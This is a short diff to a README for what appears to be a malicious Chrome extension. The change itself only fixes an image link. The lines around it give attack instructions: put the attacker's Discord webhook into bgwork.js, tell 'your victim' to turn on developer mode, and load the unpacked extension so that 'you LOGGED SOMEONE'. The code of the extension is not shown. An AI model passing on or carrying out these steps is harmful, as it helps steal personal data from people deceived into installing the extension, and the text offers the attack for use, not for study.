@@ -2,7 +2,8 @@ FIRST STEP go to bgwork.js and change where it says, "Discord WEBHOOK GOES HERE"
 
 
 SECOND STEP tell your victim to go to chrome://extensions/ AND ENABLE DEVELOPER MODE ON THE TOP RIGHT
-[dev](https://user-images.githubusercontent.com/105136784/209618827-e517103d-0f32-42c5-8109-2a829aeb7992.PNG)
+![dev](https://user-images.githubusercontent.com/105136784/209619387-cde85a4d-12d4-4803-bcc5-d87dd615f0c1.PNG)
+
 
 NEXT STEP IS PRESS "Load unpacked" AND BOOM YOU LOGGED SOMEONE.
 
